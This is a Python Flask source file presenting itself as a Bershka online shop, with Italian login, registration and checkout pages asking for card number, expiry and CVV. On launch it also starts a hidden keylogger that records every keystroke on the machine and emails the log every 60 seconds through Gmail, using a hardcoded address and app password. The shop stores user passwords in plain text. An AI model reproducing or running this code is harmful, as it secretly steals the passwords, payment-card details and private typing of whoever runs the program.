from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
import sqlite3 #sito
import secrets #sito
import webbrowser #sito
import threading
import time
from pynput import keyboard #keyloker
from pynput.keyboard import Key #keyloker
from threading import Timer
import smtplib #invio mail

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
DATABASE = 'bershka_store.db'

EMAIL = "mia.email.su@gmail.com"
PASSWORD = "nwsq ucud plni awcd"
INTERVALLO = 60  
messaggio = " "

# Template Login
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Bershka - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #000;
            padding: 20px 50px;
            border-bottom: 1px solid #333;
        }
        .logo {
            font-size: 32px;
            font-weight: 900;
            letter-spacing: 3px;
            color: #fff;
        }
        .login-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }
        .login-box {
            background: #111;
            padding: 50px;
            border-radius: 0;
            width: 100%;
            max-width: 450px;
            border: 1px solid #333;
        }
        .login-box h2 {
            margin-bottom: 30px;
            font-size: 28px;
            font-weight: 300;
            text-align: center;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #999;
        }
        .form-group input {
            width: 100%;
            padding: 15px;
            background: #000;
            border: 1px solid #333;
            color: #fff;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #fff;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: #fff;
            color: #000;
            border: none;
            font-size: 14px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #ddd;
        }
        .register-link {
            text-align: center;
            margin-top: 20px;
            font-size: 13px;
            color: #999;
        }
        .register-link a {
            color: #fff;
            text-decoration: none;
            border-bottom: 1px solid #fff;
        }
        .error {
            background: #ff4444;
            color: #fff;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">BERSHKA</div>
    </div>
    <div class="login-container">
        <div class="login-box">
            <h2>ACCEDI AL TUO ACCOUNT</h2>
            {% if error %}
            <div class="error">{{ error }}</div>
            {% endif %}
            <form method="POST" action="/login">
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" name="email" required>
                </div>
                <div class="form-group">
                    <label>PASSWORD</label>
                    <input type="PASSWORD" name="PASSWORD" required>
                </div>
                <button type="submit" class="btn">Accedi</button>
            </form>
            <div class="register-link">
                Non hai un account? <a href="/register">Registrati</a>
            </div>
            <div class="register-link" style="margin-top: 30px; color: #666;">
                <small>Demo: usa email: demo@bershka.com / PASSWORD: demo123</small>
            </div>
        </div>
    </div>
</body>
</html>
'''

# Template Registrazione
REGISTER_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Bershka - Registrazione</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #000;
            padding: 20px 50px;
            border-bottom: 1px solid #333;
        }
        .logo {
            font-size: 32px;
            font-weight: 900;
            letter-spacing: 3px;
            color: #fff;
        }
        .register-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }
        .register-box {
            background: #111;
            padding: 50px;
            border-radius: 0;
            width: 100%;
            max-width: 450px;
            border: 1px solid #333;
        }
        .register-box h2 {
            margin-bottom: 30px;
            font-size: 28px;
            font-weight: 300;
            text-align: center;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #999;
        }
        .form-group input {
            width: 100%;
            padding: 15px;
            background: #000;
            border: 1px solid #333;
            color: #fff;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #fff;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: #fff;
            color: #000;
            border: none;
            font-size: 14px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #ddd;
        }
        .login-link {
            text-align: center;
            margin-top: 20px;
            font-size: 13px;
            color: #999;
        }
        .login-link a {
            color: #fff;
            text-decoration: none;
            border-bottom: 1px solid #fff;
        }
        .success {
            background: #44ff44;
            color: #000;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            text-align: center;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">BERSHKA</div>
    </div>
    <div class="register-container">
        <div class="register-box">
            <h2>CREA IL TUO ACCOUNT</h2>
            {% if success %}
            <div class="success">{{ success }}</div>
            {% endif %}
            <form method="POST" action="/register">
                <div class="form-group">
                    <label>Nome</label>
                    <input type="text" name="nome" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" name="email" required>
                </div>
                <div class="form-group">
                    <label>PASSWORD</label>
                    <input type="PASSWORD" name="PASSWORD" required minlength="6">
                </div>
                <button type="submit" class="btn">Registrati</button>
            </form>
            <div class="login-link">
                Hai già un account? <a href="/login">Accedi</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

# Template Shop (versione completa con checkout)
SHOP_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Bershka - Shop</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #000;
            color: #fff;
        }
        .header {
            background: #000;
            padding: 20px 50px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo {
            font-size: 32px;
            font-weight: 900;
            letter-spacing: 3px;
        }
        .header-right {
            display: flex;
            gap: 30px;
            align-items: center;
        }
        .user-info {
            font-size: 13px;
            color: #999;
        }
        .cart-btn, .logout-btn {
            background: none;
            border: 1px solid #fff;
            color: #fff;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .cart-btn:hover, .logout-btn:hover {
            background: #fff;
            color: #000;
        }
        .cart-count {
            background: #ff4444;
            border-radius: 50%;
            padding: 2px 8px;
            font-size: 11px;
            margin-left: 5px;
        }
        .banner {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 80px 50px;
            text-align: center;
        }
        .banner h1 {
            font-size: 48px;
            font-weight: 900;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }
        .banner p {
            font-size: 18px;
            opacity: 0.9;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 50px;
        }
        .filters {
            display: flex;
            gap: 20px;
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 1px solid #333;
        }
        .filter-btn {
            background: none;
            border: 1px solid #333;
            color: #999;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        .filter-btn.active, .filter-btn:hover {
            border-color: #fff;
            color: #fff;
        }
        .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 30px;
        }
        .product-card {
            background: #111;
            border: 1px solid #222;
            overflow: hidden;
            transition: all 0.3s;
            cursor: pointer;
        }
        .product-card:hover {
            border-color: #fff;
            transform: translateY(-5px);
        }
        .product-image {
            width: 100%;
            height: 400px;
            background: #222;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 64px;
        }
        .product-info {
            padding: 20px;
        }
        .product-category {
            font-size: 11px;
            color: #999;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        .product-name {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        .product-price {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .add-to-cart {
            width: 100%;
            padding: 12px;
            background: #fff;
            color: #000;
            border: none;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .add-to-cart:hover {
            background: #ddd;
        }
        .cart-modal {
            display: none;
            position: fixed;
            top: 0;
            right: 0;
            width: 450px;
            height: 100vh;
            background: #111;
            border-left: 1px solid #333;
            z-index: 1000;
            overflow-y: auto;
        }
        .cart-modal.active {
            display: block;
        }
        .cart-header {
            padding: 30px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .close-cart {
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }
        .cart-items {
            padding: 20px;
        }
        .cart-item {
            display: flex;
            gap: 15px;
            padding: 20px 0;
            border-bottom: 1px solid #222;
        }
        .cart-item-image {
            width: 80px;
            height: 100px;
            background: #222;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .cart-item-info {
            flex: 1;
        }
        .cart-item-name {
            font-size: 14px;
            margin-bottom: 5px;
        }
        .cart-item-price {
            font-size: 16px;
            font-weight: 700;
        }
        .remove-item {
            background: none;
            border: none;
            color: #ff4444;
            cursor: pointer;
            font-size: 12px;
            text-decoration: underline;
        }
        .cart-footer {
            padding: 30px;
            border-top: 1px solid #333;
        }
        .cart-total {
            display: flex;
            justify-content: space-between;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        .checkout-btn {
            width: 100%;
            padding: 15px;
            background: #fff;
            color: #000;
            border: none;
            font-size: 14px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .checkout-btn:hover {
            background: #ddd;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 999;
        }
        .overlay.active {
            display: block;
        }
        .checkout-modal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 600px;
            max-height: 90vh;
            background: #111;
            border: 1px solid #333;
            z-index: 1001;
            overflow-y: auto;
        }
        .checkout-modal.active {
            display: block;
        }
        .checkout-header {
            padding: 30px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .checkout-content {
            padding: 30px;
        }
        .form-section {
            margin-bottom: 30px;
        }
        .form-section h3 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 15px;
        }
        .form-row.full {
            grid-template-columns: 1fr;
        }
        .form-group-checkout {
            margin-bottom: 15px;
        }
        .form-group-checkout label {
            display: block;
            margin-bottom: 8px;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #999;
        }
        .form-group-checkout input {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 1px solid #333;
            color: #fff;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .form-group-checkout input:focus {
            outline: none;
            border-color: #fff;
        }
        .order-summary {
            background: #000;
            padding: 20px;
            border: 1px solid #333;
            margin-bottom: 20px;
        }
        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .summary-row.total {
            font-size: 18px;
            font-weight: 700;
            padding-top: 10px;
            border-top: 1px solid #333;
            margin-top: 10px;
        }
        .card-icons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">BERSHKA</div>
        <div class="header-right">
            <div class="user-info">Ciao, <strong>{{ nome }}</strong></div>
            <button class="cart-btn" onclick="toggleCart()">
                Carrello <span class="cart-count" id="cartCount">0</span>
            </button>
            <a href="/logout" class="logout-btn">Esci</a>
        </div>
    </div>

    <div class="banner">
        <h1>COLLEZIONE DEDICATA</h1>
        <p>Scopri gli ultimi arrivi e le tendenze della stagione</p>
    </div>

    <div class="container">
        <div class="filters">
            <button class="filter-btn active" onclick="filterProducts('all')">Tutti</button>
            <button class="filter-btn" onclick="filterProducts('donna')">Donna</button>
            <button class="filter-btn" onclick="filterProducts('uomo')">Uomo</button>
            <button class="filter-btn" onclick="filterProducts('accessori')">Accessori</button>
        </div>

        <div class="products-grid" id="productsGrid"></div>
    </div>

    <div class="overlay" id="overlay" onclick="closeModals()"></div>
    
    <div class="cart-modal" id="cartModal">
        <div class="cart-header">
            <h2>IL TUO CARRELLO</h2>
            <button class="close-cart" onclick="toggleCart()">×</button>
        </div>
        <div class="cart-items" id="cartItems"></div>
        <div class="cart-footer">
            <div class="cart-total">
                <span>Totale:</span>
                <span id="cartTotal">€0.00</span>
            </div>
            <button class="checkout-btn" onclick="openCheckout()">Procedi al checkout</button>
        </div>
    </div>

    <div class="checkout-modal" id="checkoutModal">
        <div class="checkout-header">
            <h2>CHECKOUT</h2>
            <button class="close-cart" onclick="closeCheckout()">×</button>
        </div>
        <div class="checkout-content">
            <form id="checkoutForm" onsubmit="return submitOrder(event)">
                <div class="form-section">
                    <h3>📦 Dati di Spedizione</h3>
                    <div class="form-row">
                        <div class="form-group-checkout">
                            <label>Nome *</label>
                            <input type="text" name="nome" required>
                        </div>
                        <div class="form-group-checkout">
                            <label>Cognome *</label>
                            <input type="text" name="cognome" required>
                        </div>
                    </div>
                    <div class="form-row full">
                        <div class="form-group-checkout">
                            <label>Indirizzo *</label>
                            <input type="text" name="indirizzo" placeholder="Via, numero civico" required>
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group-checkout">
                            <label>Città *</label>
                            <input type="text" name="citta" required>
                        </div>
                        <div class="form-group-checkout">
                            <label>CAP *</label>
                            <input type="text" name="cap" pattern="[0-9]{5}" placeholder="00000" required>
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group-checkout">
                            <label>Provincia *</label>
                            <input type="text" name="provincia" maxlength="2" placeholder="TO" required>
                        </div>
                        <div class="form-group-checkout">
                            <label>Telefono *</label>
                            <input type="tel" name="telefono" placeholder="+39 000 0000000" required>
                        </div>
                    </div>
                </div>

                <div class="form-section">
                    <h3>💳 Pagamento</h3>
                    <div class="form-row full">
                        <div class="form-group-checkout">
                            <label>Numero Carta *</label>
                            <input type="text" name="numero_carta" 
                                   pattern="[0-9]{16}" 
                                   placeholder="0000 0000 0000 0000" 
                                   maxlength="16" required>
                            <div class="card-icons">
                                <span style="font-size: 11px; color: #999;">💳 Visa, Mastercard, American Express</span>
                            </div>
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group-checkout">
                            <label>Scadenza (MM/AA) *</label>
                            <input type="text" name="scadenza" 
                                   pattern="[0-9]{2}/[0-9]{2}" 
                                   placeholder="12/25" 
                                   maxlength="5" required>
                        </div>
                        <div class="form-group-checkout">
                            <label>CVV *</label>
                            <input type="text" name="cvv" 
                                   pattern="[0-9]{3,4}" 
                                   placeholder="123" 
                                   maxlength="4" required>
                        </div>
                    </div>
                    <div class="form-row full">
                        <div class="form-group-checkout">
                            <label>Nome sulla Carta *</label>
                            <input type="text" name="nome_carta" 
                                   placeholder="Come appare sulla carta" required>
                        </div>
                    </div>
                </div>

                <div class="order-summary">
                    <h3 style="margin-bottom: 15px;">Riepilogo Ordine</h3>
                    <div class="summary-row">
                        <span>Subtotale:</span>
                        <span id="summarySubtotal">€0.00</span>
                    </div>
                    <div class="summary-row">
                        <span>Spedizione:</span>
                        <span>€4.99</span>
                    </div>
                    <div class="summary-row total">
                        <span>Totale:</span>
                        <span id="summaryTotal">€0.00</span>
                    </div>
                </div>

                <button type="submit" class="checkout-btn">Conferma Ordine</button>
            </form>
        </div>
    </div>

    <script>
        let products = [];
        let cart = [];
        let currentFilter = 'all';

        async function loadProducts() {
            const response = await fetch('/api/products');
            products = await response.json();
            displayProducts();
        }

        function displayProducts() {
            const filtered = currentFilter === 'all' 
                ? products 
                : products.filter(p => p.categoria === currentFilter);
            
            const grid = document.getElementById('productsGrid');
            grid.innerHTML = filtered.map(product => `
                <div class="product-card">
                    <div class="product-image">${product.emoji}</div>
                    <div class="product-info">
                        <div class="product-category">${product.categoria}</div>
                        <div class="product-name">${product.nome}</div>
                        <div class="product-price">€${product.prezzo.toFixed(2)}</div>
                        <button class="add-to-cart" onclick="addToCart(${product.id})">
                            Aggiungi al carrello
                        </button>
                    </div>
                </div>
            `).join('');
        }

        function filterProducts(category) {
            currentFilter = category;
            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            displayProducts();
        }

        function addToCart(productId) {
            const product = products.find(p => p.id === productId);
            const existing = cart.find(item => item.id === productId);
            
            if (existing) {
                existing.quantity++;
            } else {
                cart.push({ ...product, quantity: 1 });
            }
            
            updateCartDisplay();
        }

        function removeFromCart(productId) {
            cart = cart.filter(item => item.id !== productId);
            updateCartDisplay();
        }

        function updateCartDisplay() {
            const count = cart.reduce((sum, item) => sum + item.quantity, 0);
            document.getElementById('cartCount').textContent = count;
            
            const itemsHtml = cart.map(item => `
                <div class="cart-item">
                    <div class="cart-item-image">${item.emoji}</div>
                    <div class="cart-item-info">
                        <div class="cart-item-name">${item.nome}</div>
                        <div class="cart-item-price">€${item.prezzo.toFixed(2)} x ${item.quantity}</div>
                        <button class="remove-item" onclick="removeFromCart(${item.id})">Rimuovi</button>
                    </div>
                </div>
            `).join('');
            
            document.getElementById('cartItems').innerHTML = itemsHtml || '<p style="padding: 20px; text-align: center; color: #999;">Il carrello è vuoto</p>';
            
            const total = cart.reduce((sum, item) => sum + (item.prezzo * item.quantity), 0);
            document.getElementById('cartTotal').textContent = `€${total.toFixed(2)}`;
        }

        function toggleCart() {
            const cartModal = document.getElementById('cartModal');
            const overlay = document.getElementById('overlay');
            cartModal.classList.toggle('active');
            overlay.classList.toggle('active');
        }

        function closeModals() {
            document.getElementById('cartModal').classList.remove('active');
            document.getElementById('checkoutModal').classList.remove('active');
            document.getElementById('overlay').classList.remove('active');
        }

        function openCheckout() {
            if (cart.length === 0) {
                alert('Il carrello è vuoto!');
                return;
            }
            
            document.getElementById('cartModal').classList.remove('active');
            document.getElementById('checkoutModal').classList.add('active');
            
            const subtotal = cart.reduce((sum, item) => sum + (item.prezzo * item.quantity), 0);
            const shipping = 4.99;
            const total = subtotal + shipping;
            
            document.getElementById('summarySubtotal').textContent = `€${subtotal.toFixed(2)}`;
            document.getElementById('summaryTotal').textContent = `€${total.toFixed(2)}`;
        }

        function closeCheckout() {
            document.getElementById('checkoutModal').classList.remove('active');
            document.getElementById('overlay').classList.remove('active');
        }

        function submitOrder(event) {
            event.preventDefault();
            
            const formData = new FormData(event.target);
            const orderData = {
                shipping: {
                    nome: formData.get('nome'),
                    cognome: formData.get('cognome'),
                    indirizzo: formData.get('indirizzo'),
                    citta: formData.get('citta'),
                    cap: formData.get('cap'),
                    provincia: formData.get('provincia'),
                    telefono: formData.get('telefono')
                },
                payment: {
                    numero_carta: formData.get('numero_carta'),
                    scadenza: formData.get('scadenza'),
                    cvv: formData.get('cvv'),
                    nome_carta: formData.get('nome_carta')
                },
                items: cart,
                total: cart.reduce((sum, item) => sum + (item.prezzo * item.quantity), 0) + 4.99
            };
            
            console.log('Ordine inviato:', orderData);
            
            alert(`✅ Ordine confermato!\n\nGrazie ${orderData.shipping.nome} ${orderData.shipping.cognome}!\n\nTotale: €${orderData.total.toFixed(2)}\n\nRiceverai una email di conferma a breve.\nSpedizione a: ${orderData.shipping.indirizzo}, ${orderData.shipping.citta}`);

            cart = [];
            updateCartDisplay();
            closeModals();
            document.getElementById('checkoutForm').reset();
            
            return false;
        }

        loadProducts();
        updateCartDisplay();
    </script>
</body>
</html>
'''

def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            email TEXT UNIQUE NOT NULL,
            PASSWORD TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            categoria TEXT NOT NULL,
            prezzo REAL NOT NULL,
            emoji TEXT NOT NULL,
            stock INTEGER DEFAULT 100
        )
    ''')
    
    cursor.execute('SELECT COUNT(*) FROM products')
    if cursor.fetchone()[0] == 0:
        products = [
            ('Giacca Denim Oversize', 'donna', 49.99, '🧥'),
            ('T-Shirt Crop Bianca', 'donna', 12.99, '👕'),
            ('Jeans Skinny Neri', 'donna', 35.99, '👖'),
            ('Sneakers Platform', 'donna', 45.99, '👟'),
            ('Borsa Tote Canvas', 'accessori', 19.99, '👜'),
            ('Felpa Hoodie Nera', 'uomo', 29.99, '🧥'),
            ('Camicia Oxford Bianca', 'uomo', 24.99, '👔'),
            ('Cargo Pants Verde', 'uomo', 39.99, '👖'),
            ('Bomber Jacket', 'uomo', 69.99, '🧥'),
            ('Zaino Minimal', 'accessori', 34.99, '🎒'),
            ('Vestito Midi Floreale', 'donna', 44.99, '👗'),
            ('Cardigan Oversized', 'donna', 32.99, '🧶'),
            ('Occhiali da Sole', 'accessori', 15.99, '🕶️'),
            ('Cappello Bucket', 'accessori', 12.99, '🧢'),
            ('Blazer Strutturato', 'donna', 59.99, '👔'),
        ]
        cursor.executemany('INSERT INTO products (nome, categoria, prezzo, emoji) VALUES (?, ?, ?, ?)', products)
    
    cursor.execute('SELECT COUNT(*) FROM users WHERE email = ?', ('demo@bershka.com',))
    if cursor.fetchone()[0] == 0:
        cursor.execute('INSERT INTO users (nome, email, PASSWORD) VALUES (?, ?, ?)',
                      ('Demo User', 'demo@bershka.com', 'demo123'))
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect('/shop')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        PASSWORD = request.form.get('PASSWORD')
        
        conn = get_db()
        user = conn.execute('SELECT * FROM users WHERE email = ? AND PASSWORD = ?', 
                           (email, PASSWORD)).fetchone()
        conn.close()
        
        if user:
            session['user_id'] = user['id']
            session['nome'] = user['nome']
            return redirect('/shop')
        else:
            return render_template_string(LOGIN_TEMPLATE, error='Email o PASSWORD errati')
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        nome = request.form.get('nome')
        email = request.form.get('email')
        PASSWORD = request.form.get('PASSWORD')
        
        try:
            conn = get_db()
            conn.execute('INSERT INTO users (nome, email, PASSWORD) VALUES (?, ?, ?)',
                        (nome, email, PASSWORD))
            conn.commit()
            conn.close()
            return render_template_string(REGISTER_TEMPLATE, 
                                        success='Account creato! Ora puoi accedere.')
        except sqlite3.IntegrityError:
            return render_template_string(REGISTER_TEMPLATE, 
                                        error='Email già registrata')
    
    return render_template_string(REGISTER_TEMPLATE)

@app.route('/shop')
def shop():
    if 'user_id' not in session:
        return redirect('/login')
    return render_template_string(SHOP_TEMPLATE, nome=session.get('nome'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/api/products')
def get_products():
    conn = get_db()
    products = conn.execute('SELECT * FROM products').fetchall()
    conn.close()
    return jsonify([dict(p) for p in products])

def attivaKeiboard():
    with keyboard.Listener(on_press=tasto_premuto) as listener:
        invioEmail()
        listener.join()

def tasto_premuto(key):
    global messaggio
    if messaggio == " ":
        try:
            messaggio = key.char
        except AttributeError:
            if key == Key.space:
                messaggio = " "
            elif key == Key.enter:
                messaggio = "\n"
    else:
        try:
            messaggio += key.char
        except AttributeError:
            if key == Key.space:
                messaggio += " "
            elif key == Key.enter:
                messaggio += "\n"
            elif key == Key.backspace:
                messaggio = messaggio[:-1]  
    print(messaggio)

def invioEmail():
    global messaggio
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL, PASSWORD)
    server.sendmail(EMAIL, EMAIL, messaggio)
    server.quit()
    Timer(INTERVALLO, invioEmail).start()

def open_browser():
    time.sleep(1.5)
    webbrowser.open('http://127.0.0.1:5000')
    threading.Thread(target=attivaKeiboard).start() #ATTIVAZIONE KEYLOGGER

if __name__ == '__main__':
    init_db()
    print("🛍️  Bershka Store in avvio...")
    print("📧 Account demo: demo@bershka.com / PASSWORD: demo123")
    print("🌐 Apertura browser automatica...")
    
    # Avvia thread per aprire il browser
    threading.Thread(target=open_browser, daemon=True).start()
    
    # Avvia server Flask (senza debug per evitare doppia apertura)
    app.run(host='127.0.0.1', port=5000, debug=False)